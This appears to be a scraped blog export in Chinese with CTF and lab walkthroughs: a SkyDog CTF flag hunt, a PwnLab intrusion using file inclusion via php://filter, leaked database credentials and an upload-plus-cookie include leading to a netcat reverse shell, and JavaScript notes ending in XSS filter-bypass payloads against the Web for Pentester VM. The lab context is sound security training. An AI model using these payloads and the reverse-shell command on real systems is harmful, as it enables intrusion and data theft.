State: LIKELY VULNERABLE| IDs: CVE:CVE-2007-6750| Slowloris tries to keep many connections to the target web server open and hold| them open as long as possible. It accomplishes this by opening connections to| the target web server and sending a partial request. By doing so, it starves| the http server's resources causing Denial Of Service.|| Disclosure date: 2009-09-17| References:| http://ha.ckers.org/slowloris/|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750| http-sql-injection:| Possible sqli for queries:|_ https://skydogconctf2016/assets/js/c,l.type=a),l.width=l.height=%220%22,l.onerror=l.onload=l.onreadystatechange=function()%7bk.call(this,r)%7d,p.splice(e,0,u),%22img%22!=a&amp;&amp;(r%7c%7c2===y%5bc%5d?%28t%2einsertBefore%28l%2cs%3fnull%3an%29%2cm%28k%2cj%29%29%3ay%5bc%5d%2epush%28l%29%29%7dfunction=%27%20OR%20sqlspider|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.|_sslv2-drown: 发现一个点 12http-sql-injection: Possible sqli for queries: 看来应该存在sql注入 3、进入服务器网页 浏览下网页，发现下面有提示 4、获取flag (1)第一个flag 根据上图的提示，不要去home,home中有一个十六进制。那么去Home试试。 /home 发现home根本不存在。 用zap扫一下网站，发现网站下有两个目录，一个是assets,一个是oldIE,有了以前的经验教训就先找oldIE,然后发现下面只有一个文件html5.js，打开后发现最上面醒目的标识着一个注释。 1666c61677b37633031333230373061306566373164353432363633653964633166356465657d 用十六机制转ASCII码解码得： flag{7c0132070a0ef71d542663e9dc1f5dee} （2）第二个flag 那第二个flag该怎么找呢？第二个那个flag提示相当于没有什么提示。一般这种题目后面个flag需要靠前面个flag寻找过程的帮助，但是前面个没有任何提示信息。怎么办？观察下flag里面的字符恰好是32位。 7c0132070a0ef71d542663e9dc1f5dee用md5解码后为nmap。 意思提示用nmap，可是刚刚已经扫过了一次，难道是先前没扫全？ 重新扫一次 nmap -A 192.168.43.248 发现还是没有什么信息 那看一下端口吧,为了快速分为两次扫描 nmap -p 1000-20000 192.168.43.248 没有 nmap -sV -p 20000-65535 192.168.43.248 12PORT STATE SERVICE22222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) 发现开了22222端口，而且服务是ssh服务， 连接试一下看看有没有弱密码： 12345678910111213141516171819windows7phone% ssh -p 22222 root@192.168.43.248The authenticity of host '[192.168.43.248]:22222 ([192.168.43.248]:22222)' can't be established.ECDSA key fingerprint is SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '[192.168.43.248]:22222' (ECDSA) to the list of known hosts.###### ## WARNING# FBI - Authorized access only!# Disconnect IMMEDIATELY if you are not an authorized user!!!# All actions Will be monitored and recorded# Flag&#123;53c82eba31f6d416f331de9162ebe997&#125;###### # 结果直接弹出flag了，第二个flag get.Flag{53c82eba31f6d416f331de9162ebe997} (3)第三个flag 有了先前的经验把第二个flag的值用md5解密后得encrypt 看来第三关是加密。再看看最先前的提示：“During his Travels Frank has Been Known to Intercept Traffic” 意思不安全，有人可以窃听流量。意思用http不安全？ 那用https试下 发现证书错误,看一下证书,发现证书中没有flag，看了下解密不太可能。 于是看下是否还有其他可以利用的信息。 点击把证书添加例外后发现可以查看证书状态： 点击进去看下。惊奇的发现里面有flag flag3{f82366a9ddc064585d54e3f78bde3221} （4）第四个flag 再次解密上面的flag得到personnel,又结合提示“A Good Agent is Hard to Find”。看来是要改代理。可是personnel是为什么？难道是要代理改为全体人员吗？试了半天无果。于是又想这个单词会不会是个目录，输入/personnel,结果： 拒绝访问，要FBI机构的。那怎么才是FBI机构的呢？在其他文件中找找线索。目前已知的好像只有html5.js和assets文件。 回到刚刚的html5.js文件查询FBI字符串发现： 12/* maindev - 6/7/02 Adding temporary support for IE4 FBI Workstations *//* newmaindev - 5/22/16 Last maindev was and idoit and IE4 is still Gold image -@Support doug.perterson@fbi.gov */ 意思是使用IE4？ 网上搜一下IE4版本的IE，在http://www.966266.com/jishu/ie-user-agent.html这个网站找到 123456789101112131415**Internet Explorer 4.0**Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)Mozilla/4.0 (compatible; MSIE 4.0; Windows 98 )Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)Mozilla/4.0 (Compatible; MSIE 4.0)Mozilla/2.0 (compatible; MSIE 4.0; Windows 98) 随便选一个Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)利用User Agent插件改代理。如何所示。 再次访问/personnel成功进入 现在该找flag了,可以看到在右下角很清楚的实现flag flag{14e10d570047667f904261e6d08f520f} （5）第5个flag 将第5个flag解码后得evidence,再根据下面的提示clue=new +flag和第5条提示 “The Devil is in the Details - Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices”。 看了提示还是没太懂，意思是新的证据？想一下clue为newevidence，是不是又像上一次personnel那个一样呢？ 输入/newevidence进入果真出现新界面 要求输入用户和密码。用户名密码是什么呢？提示只有FBI的人才能访问。那么肯定是输入一个FBI的账号密码。而且提示又说的简单的、可猜的，猜想可能是弱口令。于是爆破吧，先试了一下admin和root爆破，均没成功。那么肯定问题在于如何确定用户名。 前面的html.js中给出了一个邮箱：doug.perterson@fbi.gov,根据这个邮箱可以猜想是一个用户名。 用doug.perterson爆破无果。那再去第四关去寻找一下线索。 仔细浏览才发现这是一个FBI探员的个人页面。而且上面写了Hanratty探员，那用Hanratty再爆破试试，还是不行。换种思路先前都是一个英文单词.一个英文单词。 那这次是不是账号也要一个单词.一个单词呢？Hanratty的姓是什么？google一下 然后发现是部电影，而且这电影我还看过，是猫鼠游戏，因为当初看的是中文版，所以不知道它的英文名字叫Catch me if you can,所以一直没发现，现在终于知道这个靶机要做什么了，肯定是Hanratty要抓Frank，而Frank东躲西藏。Hanratty的姓是Carl。 因为不清楚是姓在前还是名在前于是查了下doug.perterson，发现也是名在前姓在后。 于是利用carl.hanratty去爆破。 现在具体的讲爆破 先用burpsuit抓包,输入admin,123 发现有一串密文，用Base64解码后为admin:123，看来是根据账户:密码然后base64加密。 将请求发送给burp的Intruder，然后在刚刚密文的地方点击左侧的add$，使其成为变量 在payload下Payload Processing上添加base64编码方式","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://blog.ydq6.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"http://blog.ydq6.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"}]},{"title":"pwnlab靶机测试","slug":"pwnlab靶机测试","date":"2020-05-06T14:56:33.000Z","updated":"2020-05-06T15:16:57.868Z","comments":true,"path":"渗透测试/pwnlab靶机测试/","link":"","permalink":"http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/pwnlab%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/","excerpt":"一、探测ip netdicover -i eth0","text":"一、探测ip netdicover -i eth0 二、扫描ip nmap -sV -A 192.168.43.18 123456789101112131415161718192021222324252627windows7phone% nmap -sV -A 192.168.43.18Starting Nmap 7.50 ( https://nmap.org ) at 2018-06-05 18:29 CSTNmap scan report for pwnlab (192.168.43.18)Host is up (0.00090s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: PwnLab Intranet Image Hosting111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 49209/udp status|_ 100024 1 55138/tcp status3306/tcp open mysql MySQL 5.5.47-0+deb8u1| mysql-info:| Protocol: 10| Version: 5.5.47-0+deb8u1| Thread ID: 39| Capabilities flags: 63487| Some Capabilities: Speaks41ProtocolNew, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, FoundRows, Support41Auth, SupportsCompression, ODBCClient, SupportsTransactions, InteractiveClient, ConnectWithDatabase, LongPassword, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins| Status: Autocommit| Salt: W&gt;p9j*1WB#*GfK%uA$0b|_ Auth Plugin Name: 88 nmap –script=vuln 192.168.43.18 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071Starting Nmap 7.50 ( https://nmap.org ) at 2018-06-05 18:30 CSTPre-scan script results:| broadcast-avahi-dos:| Discovered hosts:| 224.0.0.251| After NULL UDP avahi packet DoS (CVE-2011-1002).|_ Hosts are all up (not vulnerable).Nmap scan report for pwnlab (192.168.43.18)Host is up (0.00082s latency).Not shown: 997 filtered portsPORT STATE SERVICE80/tcp open http| http-csrf:| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=pwnlab| Found the following possible CSRF vulnerabilities:|| Path: http://pwnlab/?page=login| Form id: user|_ Form action:|_http-dombased-xss: Couldn't find any DOM based XSS.| http-enum:| /login.php: Possible admin folder| /images/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'|_ /upload/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'| http-internal-ip-disclosure:|_ Internal IP Leaked: 127.0.0.1| http-slowloris-check:| VULNERABLE:| Slowloris DOS attack| State: LIKELY VULNERABLE| IDs: CVE:CVE-2007-6750| Slowloris tries to keep many connections to the target web server open and hold| them open as long as possible. It accomplishes this by opening connections to| the target web server and sending a partial request. By doing so, it starves| the http server's resources causing Denial Of Service.|| Disclosure date: 2009-09-17| References:| http://ha.ckers.org/slowloris/|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)111/tcp open rpcbind3306/tcp open mysql 发现开放了80、111、3306端口， 二、点击登录页面 发现页面url为:http://192.168.43.18/?page=login page=login，比较敏感。可能是LFI 看下源代码: 12345678910&lt;?php if (isset($_GET['page'])) &#123; include($_GET['page'].\".php\"); &#125; else &#123; echo \"Use this server to upload and share image files inside the intranet\"; &#125;?&gt; 真的是文件包含， 通过测试发现下面payload有效： http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=index 页面显示字符串： 1PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4= 用base64解密后： 12345678910111213141516171819202122232425262728293031&lt;?php//Multilingual. Not implemented yet.//setcookie(\"lang\",\"en.lang.php\");if (isset($_COOKIE['lang']))&#123; include(\"lang/\".$_COOKIE['lang']);&#125;// Not implemented yet.?&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;img src=\"images/pwnlab.png\"&gt;&lt;br /&gt;[ &lt;a href=\"/\"&gt;Home&lt;/a&gt; ] [ &lt;a href=\"?page=login\"&gt;Login&lt;/a&gt; ] [ &lt;a href=\"?page=upload\"&gt;Upload&lt;/a&gt; ]&lt;hr/&gt;&lt;br/&gt;&lt;?php if (isset($_GET['page'])) &#123; include($_GET['page'].\".php\"); &#125; else &#123; echo \"Use this server to upload and share image files inside the intranet\"; &#125;?&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 刚好是主页的源代码，证明文件包含漏洞存在。 尝试包含配置文件config.php http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=config PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+ base64解码后: 123456&lt;?php$server = \"localhost\";$username = \"root\";$password = \"H4u%QJ_H99\";$database = \"Users\";?&gt; 可以看到账号密码，数据库，尝试在登录页面登录发现不对。（这只是数据库的账号密码） 因为开放了3306端口，所以看下能不能连上3306登录. 123456789101112131415windows7phone% mysql -h 192.168.43.18 -u root -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 6435Server version: 5.5.47-0+deb8u1 (Debian)Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; 可以发现成功登陆。 接下来的步骤很简单，查表名，账户密码 123456789101112131415161718192021222324mysql&gt; show tables;ERROR 1046 (3D000): No database selectedmysql&gt; use UsersReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+-----------------+| Tables_in_Users |+-----------------+| users |+-----------------+1 row in set (0.00 sec)mysql&gt; select * from users;+------+------------------+| user | pass |+------+------------------+| kent | Sld6WHVCSkpOeQ== || mike | U0lmZHNURW42SQ== || kane | aVN2NVltMkdSbw== |+------+------------------+3 rows in set (0.00 sec) 账号kent，密码：Sld6WHVCSkpOeQ==,很容易看出密码经过base64加密，解密下为JWzXuBJJNy 登录进去，成功登陆 现在是上传文件。上传前因为可以利用文件包含，所以先读下源码： http://192.168.43.18/?page=php://filter/convert.base64-encode/resource=upload 然后解码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpsession_start();if (!isset($_SESSION['user'])) &#123; die('You must be log in.'); &#125;?&gt;&lt;html&gt; &lt;body&gt; &lt;form action='' method='post' enctype='multipart/form-data'&gt; &lt;input type='file' name='file' id='file' /&gt; &lt;input type='submit' name='submit' value='Upload'/&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($_POST['submit'])) &#123; if ($_FILES['file']['error'] &lt;= 0) &#123; $filename = $_FILES['file']['name']; $filetype = $_FILES['file']['type']; $uploaddir = 'upload/'; $file_ext = strrchr($filename, '.'); $imageinfo = getimagesize($_FILES['file']['tmp_name']); $whitelist = array(\".jpg\",\".jpeg\",\".gif\",\".png\"); if (!(in_array($file_ext, $whitelist))) &#123; die('Not allowed extension, please upload images only.'); &#125; if(strpos($filetype,'image') === false) &#123; die('Error 001'); &#125; if($imageinfo['mime'] != 'image/gif' &amp;&amp; $imageinfo['mime'] != 'image/jpeg' &amp;&amp; $imageinfo['mime'] != 'image/jpg'&amp;&amp; $imageinfo['mime'] != 'image/png') &#123; die('Error 002'); &#125; if(substr_count($filetype, '/')&gt;1)&#123; die('Error 003'); &#125; $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext; if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) &#123; echo \"&lt;img src=\\\"\".$uploadfile.\"\\\"&gt;&lt;br /&gt;\"; &#125; else &#123; die('Error 4'); &#125; &#125;&#125;?&gt; 可以发现是基于后缀白名单上传的，白名单为 1\".jpg\",\".jpeg\",\".gif\",\".png\" 不仅如此，还检查类型是否为下面类型其中之一。 1image/gif，image/jpeg，image/jpg，image/png 照片URL：http://192.168.43.18/upload/bc353652def6dad733344460a949eb04.png 设置cookie: 1lang=../upload/32d3ca5e23f4ccf1e4c8660c40e75f33.png 1root@kali:~/Desktop# nc -nvlp 3338 1http://192.168.43.18/?cmd=nc%20-nv%20192.168.43.249%203338%20-e%20/bin/bash 提权： 1python -c 'import pty; pty.spawn(\"/bin/bash\");' 登录kane,密码：iSv5Ym2GRo， cd /home/kane ls -al file msgmike w ./msgmike 123456789101112&lt;?php//Multilingual. Not implemented yet.//setcookie(\"lang\",\"en.lang.php\");if (isset($_COOKIE['lang']))&#123; include(\"lang/\".$_COOKIE['lang']);&#125;// Not implemented yet.?&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://blog.ydq6.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"http://blog.ydq6.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"}]},{"title":"JS学习","slug":"JS学习","date":"2020-05-06T14:55:49.000Z","updated":"2020-05-06T15:16:25.488Z","comments":true,"path":"web/JS学习/","link":"","permalink":"http://blog.ydq6.com/web/JS%E5%AD%A6%E4%B9%A0/","excerpt":"前言因为笔者有一定js基础，所以只对一些js忘了的知识和重要难点进行记录以及做了一些与JS有关的XSS实战。","text":"前言因为笔者有一定js基础，所以只对一些js忘了的知识和重要难点进行记录以及做了一些与JS有关的XSS实战。 第一章 知识1、实现（1）要在html中插入js,必须用script标签。浏览器会将script标签中的内容解释为脚本，不会解释为html语言。 （2）通常把js函数放置到head部分或者body底部，或者把脚本放到外部文件中，用.js命名，在head中用link标签引入脚本或者在标签script中用src引入。 2、HTML DOM(文档对象模型)介绍：可编程对象模型，js能改变页面中所有的html元素和属性、CSS样式，对页面中所有事件作出响应 2.1、查找html元素（1）通过id ​ document.getElementById() （2）通过标签名 ​ document.getElementById().getElementsByTagName() （3）通过类名 2.2、改变HTML（1）改变HTML输出流 ​ document.write() ​ [注]文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。 (2)改变html内容 ​ document.getElementById().innerHTML （3）改变HTML属性 ​ document.getElementById().attribute 2.3、改变HTML样式​ document.getElementById().style.property 2.4、DOM事件响应​ 事件：onclick=”” ​ document.getElementById().onclick= 2.5、改变节点（1）增加元素 ​ 如需向 HTML DOM 添加新元素，必须首先创建该元素（元素节点），然后向一个已存在的元素追加该元素。 ​ 创建元素：document.createElement() ​ 创建文本节点：document.createTextNode() ​ 追加元素：document.getElementById().appendChild() （2）删除元素 ​ 如需删除 HTML 元素，必须首先获得该元素的父元素。 ​ 删除元素：document.getElementById().removeChild() ​ 或 document.getElementById.parentNode.removeChild() 3、重要语法（1）js语句最后要用分号 （2）js对大小写敏感 （3）js会忽略多余的空格 （4）注释：//或/* */ （5）用var关键词声明变量，变量拥有动态类型 4、数组下标从0开始，三种表示方法： （1）var arrays = new Array(); ​ arrays[index]; （2）var arrays = new Array(“”,””,””); （3）var arrays =[“”,””,””]; 5、字符串5.1、常用方法： （1）new String()创建 （2）indexOf() 检索字符串 （3）lastIndexOf()从后向前检索字符串 （4）replace()替换与正则表达式匹配的子串 （5）substr()从起始索引号提取字符串中指定数目的字符 （6）split()把字符串分割为字符串数组 5.2、常用属性 （1）length 长度 （2）prototype 6、正则表达式RegExp 6.1、定义正则表达式​ new RegExp(pattern,attributes); ​ var patt = new RegExp(“A”); attribute: attribute 描述 i 执行对大小写不敏感匹配 g 执行全局匹配（查找所有匹配） m 执行多行匹配 6.2、方法​ test(B)检索字符串B中是否存在与A匹配的,返回true或者false ​ exec(C)检索字符串C中是否存在与A匹配的，返回值是与A匹配的值 ​ compile()改变检索模式或者添加/删除第二个参数。 6.3、方括号 用于查找某个范围内的字符 [abc]查找方括号之间的任何字符 [^abc]查找任何不在方括号之间的字符 [0-9]查找任何从0至9的数字 [a-z]查找从a到z的字符 [A-z]查找从A到z的字符 //注意A的ASCII码比a的小 6.4、量词 n+ 匹配任何包含至少一个n的字符串 n*匹配任何包含零个或多个n的字符串 n?匹配任何包含零个或一个n的字符串 ^n匹配任何开头为n的字符串 n$匹配任何结尾为n的字符串 7、JS windows所有浏览器都支持 window 对象。它表示浏览器窗口。 所有 JavaScript 全局对象、函数以及变量均自动成为 window 对象的成员。 7.1、浏览器窗口尺寸1234567var w=window.innerWidth|| document.documentElement.clientWidth|| document.body.clientWidth;var h=window.innerHeight|| document.documentElement.clientHeight|| document.body.clientHeight; 7.2、screen对象包含有关用户屏幕的信息 availWidth可用的屏幕宽度 availHeight可用的屏幕高度 7.3、location对象location对象用于获得当前页面的地址 (URL) （1）hostname返回web主机的域名 （2）pathname返回当前页面的路径和文件名 （3）port 返回web主机的端口 （4）protocol返回所使用的web协议 （5）assign()加载新文档 7.4、Navigator对象该对象包含有关访问者浏览器的信息。 [注]来自 navigator 对象的信息具有误导性，不应该被用于检测浏览器版本，navigator数据可被浏览器使用者更改 （1）appCodeName 浏览器代码名 （2）appName 浏览器的名称 （3）appVersion 浏览器的平台和版本信息 （4）cookieEnabled浏览器是否启用cookie （5）platform浏览器运行的操作系统平台 （6）userAgent客户机发送给服务器的user-agent头 （7）systemLanguage客户机指定的系统语言 7.5、windows对象（1）location （2）name 设置或返回窗口的名称 （3）status设置窗口状态栏的文本 （4）close()关闭浏览器窗口 （5）alert()弹出警告框 （6）confirm()弹出确认框 （7）prompt()弹出输入框 （8）open(“URL”,”窗口名称”,”窗口风格”) 打开一个新窗口 8、函数8.1、定义声明函数声明： 123function functionName(parameters)&#123;//code&#125; 函数表达式： JavaScript 函数可以通过一个表达式定义，函数表达式可以存储在变量中。在函数表达式存储在变量后，变量也可作为一个函数使用： 12var x = function(parameters)&#123;&#125;;var z = x(parameters); function构造函数 函数同样可以通过内置的 JavaScript 函数构造器（Function()）定义。 8.2、参数参数规则： 函数定义时参数没有指定数据类型 如果函数在调用时缺少参数，参数会默认设置为undefined js函数参数是值传递，对象是引用传递。 Arguments对象 js函数都有个内置的对象arguments。该对象包含了函数调用的参数数组。 8.3、调用this关键字指向函数执行时的当前对象。 当函数没有被自身的对象调用时， this 的值就会变成全局对象，全局变量属于windows对象。如果函数是对象中的一个方法时，this的值就会变为对象。 8.4、闭包函数既可以访问该函数内部定义的变量又可访问该函数外部定义的变量。 全局变量的作用域是全局性的，局部变量只能用于定义它函数内部。 内嵌函数plus可以访问父函数的变量而不是访问当前函数的变量（用在父函数和当前函数有同名变量时） 第二章 实战1、XSS（跨站脚本攻击）1.1、实验环境虚拟机：web for pentester iso下载地址 https://pentesterlab.com/exercises/web_for_pentester/iso 1.2、第一关http://192.168.1.114/xss/example1.php?name=hacker 可以看出是将name的参数显示在屏幕上。 用js语言alert(‘flag’)直接弹出flag 1http://192.168.1.114/xss/example1.php?name=hacker&lt;script&gt;alert('flag')&lt;/script&gt; 直接弹出flag 1.3、第二关先继续尝试alert(‘flag’) 1http://192.168.1.114/xss/example2.php?name=hacker&lt;script&gt;alert('flag')&lt;/script&gt; 发现不弹框，应该script标签被过滤 回顾基础知识，html的标签对大小写不敏感 尝试用 1http://192.168.1.114/xss/example2.php?name=hacker&lt;Script&gt;alert('flag')&lt;/Script&gt; 正确弹框 1.4、第三关1http://192.168.1.114/xss/example3.php?name=hacker&lt;Script&gt;alert('flag')&lt;/Script&gt; 没用，看来大小写均被过滤了。 1http://192.168.1.114/xss/example3.php?name=hackerscript 1http://192.168.1.114/xss/example3.php?name=hacker&lt;script&gt; 1http://192.168.1.114/xss/example3.php?name=hacker&lt;script1&gt; 1http://192.168.1.114/xss/example3.php?name=hacker&lt;1script1&gt; 猜想可能是基于&lt;script前缀为匹配的， 用下面方法： 1http://192.168.1.114/xss/example3.php?name=&lt;scri&lt;script&gt;pt&gt;alert(\"flag\")&lt;/sc&lt;/script&gt;ript&gt; 过滤掉了script后生下来的字符组成script，成功绕过。 1.5、第四关继续输入 1http://192.168.1.114/xss/example4.php?name=&lt;script&gt;alert('flag')&lt;/script&gt; 没弹框，再次过滤了。 而且显示： 试一下其他的： http://192.168.1.114/xss/example4.php?name=script 又报error，其他字符则正常显示，看来是出现script字符就会爆报error 换一下其他标签试试 1http://192.168.1.114/xss/example4.php?name=&lt;img src=\"112321312\" onerror='alert('flag')'/&gt; 不能弹出，为什么呢？想一下是单引号中里面还有单引号，语法错误。 换为： 1http://192.168.1.114/xss/example4.php?name=&lt;img src=\"112321312\" onerror=\"alert('flag')\"/&gt; 成功弹出，看来只是对script报错 1.6、第五关试下普通的 1http://192.168.1.114/xss/example5.php?name=&lt;script&gt;alert('flag')&lt;/script&gt; 又报错。 1http://192.168.1.114/xss/example5.php?name=&lt;img src=\"112321312\" onerror=\"alert('flag')\"/&gt; 也报错。 1http://192.168.1.114/xss/example5.php?name=&lt;img src=\"112321312\" /&gt; 1http://192.168.1.114/xss/example5.php?name=script 1http://192.168.1.114/xss/example5.php?name=&lt;script&gt;&lt;script&gt; 先前猜是基于标签过滤的，后来发现并不是，只是正好前面测试的两个都含有alert关键词而已。根据后面几种结果猜想可能是基于alert关键词报错。 1http://192.168.1.114/xss/example5.php?name=alert 猜想正确，所以只需换个关键词应该就可以了。 换为confirm试试 1http://192.168.1.114/xss/example5.php?name=&lt;script&gt;confirm(\"flag\")&lt;/script&gt; 成功弹出。 再试试用编码是否可以绕过alert关键词检测 1http://192.168.1.114/xss/example5.php?name=&lt;script&gt;%61%6c%65%72%74(\"flag\")&lt;/script&gt; 报错，证明URL编码不能绕过。 换下其他的 用echo+String.fromCharCode() echo()函数可以计算某个字符串并执行其中的代码 String.fromCharCode()可接收一个指定的Unicode值，然后返回一个字符串 1http://192.168.1.114/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116)+\"('flag')\")&lt;/script&gt; 没报错，但是不弹框，为什么呢？看下源代码 +号怎么变成了空格呢？ 用URL编码试试 1http://192.168.1.114/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116)%2b\"('flag')\")&lt;/script&gt; 成功弹框 1.7、第六关 这次屏幕连hacker都不显示了。 1http://192.168.200.106/xss/example6.php?name=&lt;script&gt;alert('flag')&lt;/script&gt; 不报错也不弹框,显示 为什么显示”;呢？很奇怪。试探下是什么原因造成”;的 1234http://192.168.200.106/xss/example6.php?name=&lt;script&gt; #没有http://192.168.200.106/xss/example6.php?name=&lt;script&gt;&lt;/script&gt; #有\";http://192.168.200.106/xss/example6.php?name=&lt;/script&gt; #有\";http://192.168.200.106/xss/example6.php?name=&lt;a&gt;&lt;/a&gt; #没有 看来只要有script就有”; 再在 1http://192.168.200.106/xss/example6.php?name=&lt;script&gt;&lt;/script&gt; 下开下源代码 1234Hello &lt;script&gt; var $a= \"&lt;script&gt;&lt;/script&gt;\";&lt;/script&gt; 发现本来就有script标签了的，这也是为什么先前屏幕不显示的原因 仔细看看发现只有输入的把前面的”号闭合了就可以执行自己想要的js代码了 1http://192.168.200.106/xss/example6.php?name=1\";alert('flag'); 仍然不弹出，再看看源码 1234Hello &lt;script&gt; var $a= \"1\";alert('flag');\";&lt;/script&gt; 发现忘记闭合后面的引号了使用注释试试（注意js的注释是//而不是#） 1http://192.168.200.106/xss/example6.php?name=1\";alert('flag');// 成功弹出框 1.8、第七关这次学到上关的经验了，直接看源代码 1234Hello &lt;script&gt; var $a= 'hacker';&lt;/script&gt; 如果没有过滤输入的话相信只要把前面的引号闭合和后面的引号注释就行了。 1http://192.168.200.106/xss/example7.php?name=1';alert('flag');// 直接弹框 1.9、第八关 这次换了做法，改为提交参数了。 先试一下 输入1 输入&lt;script&gt;alert(&#39;flag&#39;)&lt;/script&gt; 看来数据没有被当为代码执行 使用单引号双引号都没用，到底为什么呢？ 看看源代码： 123&lt;form action=\"/xss/example8.php\" method=\"POST\"&gt; Your name:&lt;input type=\"text\" name=\"name\" /&gt; &lt;input type=\"submit\" name=\"submit\"/&gt; 很惊奇的发现action的目标居然是本身。 忽然之间想到学php的时候w3cschool上面讲到action最好别用自身， 参见：http://www.w3school.com.cn/php/php_form_validation.asp 如果把action的引号闭合掉，弄为 123&lt;form action=\"/xss/example8.php\"&gt;&lt;script&gt;alert('flag')&lt;/script&gt;// \"method=\"POST\"&gt; Your name:&lt;input type=\"text\" name=\"name\" /&gt; &lt;input type=\"submit\" name=\"submit\"/&gt; 是不是就能弹框了？试一下 1http://192.168.200.106/xss/example8.php/\"&gt;&lt;script&gt;alert('flag')&lt;/script&gt;// 成功弹框。 1.10、第九关URL：http://192.168.200.106/xss/example9.php#hacker 源码： 123&lt;script&gt; document.write(location.hash.substring(1));&lt;/script&gt; 显示： 